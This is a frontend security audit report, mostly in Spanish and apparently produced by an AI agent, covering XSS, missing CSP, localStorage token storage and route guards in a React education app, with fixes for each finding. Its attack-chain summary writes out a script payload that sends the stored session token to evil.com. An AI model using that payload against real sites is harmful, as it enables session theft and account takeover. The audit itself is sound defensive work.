# Security Audit -- Pass 1: Frontend Security

**Date:** 2026-03-18
**Auditor:** UI Infra Agent (Opus 4.6)
**Scope:** `numero1_sseki_2325_55/` (React 18 + Vite 6 + Tailwind v4)
**Domain:** XSS, CSP, Secrets, Route Guards, Dependencies, Error Handling

---

## Summary

| Severity | Count |
|----------|-------|
| CRITICAL | 2     |
| HIGH     | 3     |
| MEDIUM   | 4     |
| LOW      | 3     |
| INFO     | 2     |
| **Total** | **14** |

---

## Findings

### [FE-001] dangerouslySetInnerHTML without sanitization (8 instances)

- **Severity**: CRITICAL
- **Archivos**:
  - `src/app/components/student/ViewerBlock.tsx:61` -- `c.html || c.text`
  - `src/app/components/student/ViewerBlock.tsx:228` -- `c.text || c.html` (callout variant)
  - `src/app/components/summary/ChunkRenderer.tsx:65` -- `enrichHtmlWithImages(chunk.content)`
  - `src/app/components/content/StudentSummaryReader.tsx:322` -- `htmlPages[safePage]`
  - `src/app/components/content/StudentSummaryReader.tsx:420` -- `enrichHtmlWithImages(chunk.content)`
  - `src/app/components/student/ReaderChunksTab.tsx:73` -- `enrichHtmlWithImages(chunk.content)`
  - `src/app/components/student/ReaderHeader.tsx:181` -- `htmlPages[safePage]`
  - `src/app/components/ui/chart.tsx:83` -- CSS theme injection (controlled data, lower risk)
- **Descripcion**: Todas las instancias de `dangerouslySetInnerHTML` renderizan HTML proveniente del backend (summary chunks, blocks) sin pasar por DOMPurify ni ningun otro sanitizador. Se busco `DOMPurify`, `sanitize`, `purify` en todo el proyecto y no existe ninguna dependencia ni llamada de sanitizacion HTML. La funcion `enrichHtmlWithImages()` en `lib/summary-content-helpers.tsx` transforma URLs en `<img>` tags pero NO sanitiza el HTML de entrada.
- **Evidencia**:
  ```tsx
  // ViewerBlock.tsx:61
  <div className="axon-prose max-w-none"
       dangerouslySetInnerHTML={{ __html: html }}
       role="article" />
  ```
  ```tsx
  // ChunkRenderer.tsx:65
  dangerouslySetInnerHTML={{ __html: enrichHtmlWithImages(chunk.content, 'light') }}
  ```
  No hay ningun import de DOMPurify en el proyecto. `package.json` no incluye `dompurify` como dependencia.
- **Impacto**: Si un profesor o el sistema de IA genera contenido HTML malicioso (o si se compromete la DB), se ejecuta JavaScript arbitrario en el navegador del estudiante. Esto permite robo de sesion (JWT en localStorage), keylogging, phishing, y exfiltracion de datos. El vector es realista: contenido se genera via Gemini/Claude y se almacena en la DB sin validacion de salida.
- **Documentado**: No esta en KNOWN-BUGS.md.

---

### [FE-002] JWT almacenado en localStorage (vulnerable a XSS)

- **Severity**: CRITICAL
- **Archivos**:
  - `src/app/lib/api.ts:38` -- `localStorage.setItem('axon_access_token', t)`
  - `src/app/context/AuthContext.tsx:220,367-369,377,401` -- `localStorage.setItem/removeItem('axon_active_membership',...)`
  - `src/app/services/apiConfig.ts:28` -- `localStorage.getItem(TOKEN_KEY)` fallback
- **Descripcion**: El JWT de sesion se persiste en `localStorage` bajo la key `axon_access_token`. Ademas, datos de membership se guardan en `axon_active_membership`. localStorage es accesible desde cualquier script JS en el mismo origen, por lo que un XSS (ver FE-001) puede exfiltrar el token trivialmente.
- **Evidencia**:
  ```ts
  // api.ts:34-41
  export function setAccessToken(t: string | null) {
    _accessToken = t;
    if (t) {
      localStorage.setItem('axon_access_token', t);
    } else {
      localStorage.removeItem('axon_access_token');
    }
  }
  ```
- **Impacto**: Combinado con FE-001, un atacante puede leer `localStorage.getItem('axon_access_token')` y enviar el JWT a un servidor externo, obteniendo acceso completo a la cuenta de la victima.
- **Documentado**: No esta en KNOWN-BUGS.md. Es una decision arquitectural (Supabase SDK usa localStorage por defecto).

---

### [FE-003] Sin Content-Security-Policy

- **Severity**: HIGH
- **Archivo**: `vercel.json` (lineas 9-24), `index.html`
- **Descripcion**: El deployment en Vercel configura headers de seguridad parciales (`X-Content-Type-Options: nosniff`, `X-Frame-Options: DENY`, `Referrer-Policy: strict-origin-when-cross-origin`) pero NO incluye `Content-Security-Policy`. Tampoco hay meta tag CSP en `index.html`.
- **Evidencia**:
  ```json
  // vercel.json -- headers completos (no hay CSP)
  {
    "source": "/(.*)",
    "headers": [
      { "key": "X-Content-Type-Options", "value": "nosniff" },
      { "key": "X-Frame-Options", "value": "DENY" },
      { "key": "Referrer-Policy", "value": "strict-origin-when-cross-origin" }
    ]
  }
  ```
- **Impacto**: Sin CSP, un XSS puede cargar scripts externos, enviar datos a cualquier dominio, y ejecutar inline scripts sin restriccion. CSP es la principal defensa en profundidad contra XSS.
- **Documentado**: No esta en KNOWN-BUGS.md.

---

### [FE-004] Supabase anon key hardcodeada en 3 archivos

- **Severity**: HIGH
- **Archivos**:
  - `src/app/lib/supabase.ts:10` -- origen canonico
  - `src/app/lib/config.ts:13` -- duplicado
  - `src/app/lib/api.ts:22` -- importa desde supabase.ts (correcto)
- **Descripcion**: La `SUPABASE_ANON_KEY` esta hardcodeada directamente en el codigo fuente en vez de usar variables de entorno. Esto es el patron documentado de Supabase (la anon key es publica por diseno), pero la duplicacion en `config.ts` crea riesgo de desincronizacion.
- **Evidencia**:
  ```ts
  // supabase.ts:9-10
  export const SUPABASE_URL = 'https://xdnciktarvxyhkrokbng.supabase.co';
  export const SUPABASE_ANON_KEY = 'eyJhbGciOiJIUzI1NiIs...';
  ```
  ```ts
  // config.ts:11-13 (DUPLICADO)
  export const supabaseUrl = 'https://xdnciktarvxyhkrokbng.supabase.co';
  export const supabaseAnonKey = 'eyJhbGciOiJIUzI1NiIs...';
  ```
- **Impacto**: La anon key por si sola solo permite acceso a Supabase con permisos `anon`. El riesgo real depende de las politicas RLS del backend (BUG-003 en KNOWN-BUGS.md documenta que RLS esta deshabilitado en tablas de contenido, lo que amplifica el riesgo). La duplicacion puede causar que se actualice una y no la otra.
- **Documentado**: Si -- BUG-025 en KNOWN-BUGS.md.

---

### [FE-005] Student routes sin RequireRole guard

- **Severity**: HIGH
- **Archivo**: `src/app/routes.tsx:100-107`
- **Descripcion**: Las rutas de Owner, Admin y Professor estan envueltas en `<RequireRole roles={[...]} />`, pero las rutas de Student no tienen guard de rol. Un usuario con rol `professor` podria navegar a `/student/*` y acceder a la vista de estudiante.
- **Evidencia**:
  ```tsx
  // routes.tsx:100-107 -- student routes SIN RequireRole
  {
    path: 'student',
    lazy: () => import('@/app/components/layout/StudentLayout')
      .then(m => ({ Component: m.StudentLayout })),
    children: studentChildren,
  },

  // Comparar con owner (tiene guard):
  {
    element: <RequireRole roles={['owner']} />,
    children: [{ path: 'owner', ... }],
  },
  ```
- **Impacto**: Un profesor o admin podria acceder a rutas de estudiante. Dependiendo de como StudentDataContext resuelve el studentId, podria ver datos de otro usuario o causar errores. El riesgo real depende del backend (si valida el rol en cada endpoint).
- **Documentado**: No esta en KNOWN-BUGS.md.

---

### [FE-006] Sin HTTPS enforcement en frontend

- **Severity**: MEDIUM
- **Archivos**: `vercel.json`, `index.html`
- **Descripcion**: No hay header `Strict-Transport-Security` (HSTS) configurado en `vercel.json`. Vercel fuerza HTTPS por defecto en su CDN, pero sin HSTS el navegador no recordara que debe usar HTTPS en visitas futuras, dejando una ventana para ataques de downgrade.
- **Evidencia**: Ausencia de HSTS en `vercel.json` headers.
- **Impacto**: Bajo en la practica porque Vercel redirige HTTP a HTTPS automaticamente. Sin embargo, sin HSTS, la primera peticion de un usuario podria ir por HTTP y ser interceptada (MITM).
- **Documentado**: No.

---

### [FE-007] ErrorBoundary expone error.message al usuario

- **Severity**: MEDIUM
- **Archivo**: `src/app/components/shared/ErrorBoundary.tsx:68`
- **Descripcion**: El fallback por defecto del ErrorBoundary muestra `this.state.error.message` directamente al usuario. Si un error contiene informacion sensible (paths del servidor, nombres de tablas DB, stack traces), se expone en la UI.
- **Evidencia**:
  ```tsx
  // ErrorBoundary.tsx:67-69
  <p style={{ color: '#7f1d1d', fontSize: '0.875rem', marginBottom: '1rem' }}>
    {this.state.error.message}
  </p>
  ```
- **Impacto**: Information disclosure. Los mensajes de error del backend (`ApiError`) podrian filtrar nombres de tablas, columnas, o logica interna.
- **Documentado**: No.

---

### [FE-008] enrichHtmlWithImages inyecta URLs sin validacion

- **Severity**: MEDIUM
- **Archivo**: `src/app/lib/summary-content-helpers.tsx:40-62`
- **Descripcion**: La funcion `enrichHtmlWithImages` extrae URLs del HTML y las inyecta en atributos `src` de `<img>` tags. Las URLs no se validan contra un allowlist de dominios. Un contenido malicioso podria incluir URLs con protocolos peligrosos o dominios de tracking/phishing.
- **Evidencia**:
  ```ts
  // summary-content-helpers.tsx:47-48
  (_m, url) =>
    `<figure class="my-4"><img src="${url}" alt="" loading="lazy" ...`
  ```
  No hay validacion de que `url` use protocolo `https://` o pertenezca a un dominio confiable (ej: `supabase.co`, `mux.com`).
- **Impacto**: Un profesor podria insertar imagenes de dominios arbitrarios (tracking pixels, contenido inapropiado). Menor si hay validacion en backend.
- **Documentado**: No.

---

### [FE-009] Sin archivo .env -- secrets hardcodeados en source

- **Severity**: MEDIUM
- **Archivos**: `src/app/lib/supabase.ts`, `src/app/lib/config.ts`
- **Descripcion**: No existe archivo `.env` ni `.env.local`. Todos los valores de configuracion (Supabase URL, anon key) estan hardcodeados directamente en el codigo TypeScript. El `.gitignore` incluye `.env` y `.env.local`, lo cual es correcto, pero los secrets estan en el codigo fuente de todos modos.
- **Evidencia**: `.env` no existe (verificado). `config.ts` y `supabase.ts` contienen la URL y anon key como string literals.
- **Impacto**: Para la anon key de Supabase esto es aceptable (es publica por diseno). Pero el patron establece un precedente peligroso: si algun dia se necesita una key privada, la costumbre sera hardcodearla.
- **Documentado**: Si -- mencionado en CLAUDE.md ("config values are hardcoded in src/app/lib/config.ts").

---

### [FE-010] Open redirect parcial en LoginPage

- **Severity**: LOW
- **Archivo**: `src/app/components/auth/LoginPage.tsx:48`
- **Descripcion**: Despues del login exitoso, la pagina redirige al `pathname` almacenado en `location.state.from`. Este valor es controlado por `RequireAuth` (que pasa `location` como state), pero solo se usa `.pathname` (no query params ni la URL completa), lo cual limita el riesgo.
- **Evidencia**:
  ```ts
  // LoginPage.tsx:48
  const from = (location.state as any)?.from?.pathname || '/';
  navigate(from, { replace: true });
  ```
- **Impacto**: Bajo. El `from` viene del router state de React Router (no de query params), lo que hace dificil de explotar externamente. Sin embargo, no hay validacion de que `from.pathname` sea una ruta interna valida.
- **Documentado**: No.

---

### [FE-011] Sin package-lock.json en git

- **Severity**: LOW
- **Archivo**: `.gitignore:6` -- `package-lock.json` esta en .gitignore
- **Descripcion**: El `package-lock.json` esta explicitamente en `.gitignore`. Esto significa que las versiones exactas de dependencias no estan fijadas en el repositorio, y cada `npm install` puede resolver versiones diferentes.
- **Evidencia**:
  ```
  # .gitignore:6
  package-lock.json
  ```
  El archivo SI existe localmente (verificado), pero no se commitea.
- **Impacto**: Un supply chain attack podria inyectar una dependencia maliciosa en una version patch que se instalaria silenciosamente en el siguiente deploy. `pnpm.overrides` en package.json solo fija `vite`.
- **Documentado**: No.

---

### [FE-012] Sin CSRF protection en formularios

- **Severity**: LOW
- **Archivo**: N/A (patron general)
- **Descripcion**: La aplicacion es un SPA que usa fetch para todas las mutaciones. No hay tokens CSRF. Sin embargo, la API usa headers personalizados (`Authorization`, `X-Access-Token`) que no se envian automaticamente por el navegador en peticiones cross-origin, lo que proporciona proteccion CSRF implicita.
- **Impacto**: Bajo. Los headers personalizados actuan como proteccion CSRF natural (el navegador no los envia en form submits cross-origin ni en peticiones simples). El riesgo es minimo mientras el backend no acepte peticiones sin estos headers.
- **Documentado**: No.

---

### [FE-013] Supabase SDK persiste session en localStorage

- **Severity**: INFO
- **Archivo**: `src/app/lib/supabase.ts:19` -- `persistSession: true`
- **Descripcion**: El cliente Supabase esta configurado con `persistSession: true` y `autoRefreshToken: true`. Esto almacena la sesion de Supabase (incluyendo refresh token) en localStorage. Es el comportamiento por defecto del SDK y es independiente del almacenamiento manual en FE-002.
- **Evidencia**:
  ```ts
  createClient(SUPABASE_URL, SUPABASE_ANON_KEY, {
    auth: { persistSession: true, autoRefreshToken: true, ... },
  });
  ```
- **Impacto**: Duplica la superficie de ataque XSS-to-token-theft. Si se mitiga FE-002 moviendo el JWT manual a httpOnly cookies, Supabase SDK seguiria exponiendo su propia sesion en localStorage.
- **Documentado**: No.

---

### [FE-014] No se encontraron eval(), new Function(), ni .innerHTML =

- **Severity**: INFO
- **Archivos**: N/A
- **Descripcion**: Se busco `eval(`, `new Function(`, `.innerHTML =` en todo `src/`. No se encontro ninguna instancia. Los unicos vectores de inyeccion HTML son los `dangerouslySetInnerHTML` documentados en FE-001.
- **Impacto**: Positivo. No hay vectores adicionales de code injection.
- **Documentado**: N/A.

---

## Resumen Ejecutivo

Las dos vulnerabilidades criticas (FE-001 y FE-002) forman una cadena de ataque completa:

1. **FE-001** permite inyectar y ejecutar JavaScript arbitrario via contenido HTML no sanitizado en 7 componentes de visualizacion de resumenes.
2. **FE-002** almacena el JWT de sesion en localStorage, accesible desde cualquier script JS.
3. **FE-003** (sin CSP) elimina la unica defensa en profundidad que podria mitigar el XSS.

**Cadena de ataque**: Un profesor malicioso (o contenido AI contaminado) inserta `<script>fetch('https://evil.com/steal?t='+localStorage.getItem('axon_access_token'))</script>` en el contenido de un resumen. Cuando un estudiante lo visualiza, el JWT se exfiltra. Con el JWT, el atacante tiene acceso completo a la cuenta del estudiante.

### Remediaciones Prioritarias

| Prioridad | Finding | Remediacion |
|-----------|---------|-------------|
| P0 | FE-001 | Instalar `dompurify` y sanitizar TODO HTML antes de `dangerouslySetInnerHTML`. Crear wrapper `safeDangerousHtml()`. |
| P0 | FE-003 | Agregar `Content-Security-Policy` en `vercel.json` con `script-src 'self'`, `style-src 'self' 'unsafe-inline'`, `img-src 'self' https: data:`. |
| P1 | FE-002 | Evaluar migrar a httpOnly cookies (requiere cambio backend). A corto plazo, priorizar FE-001/FE-003 para eliminar el vector XSS. |
| P1 | FE-005 | Agregar `<RequireRole roles={['student']} />` wrapper a las rutas de student. |
| P2 | FE-006 | Agregar `Strict-Transport-Security: max-age=63072000; includeSubDomains` en `vercel.json`. |
| P2 | FE-007 | Usar mensaje generico en ErrorBoundary fallback (no `error.message`). |
| P2 | FE-011 | Sacar `package-lock.json` del `.gitignore` y commitearlo. |

---

*Fin del reporte. Siguiente paso recomendado: Pass 2 (Backend Security).*
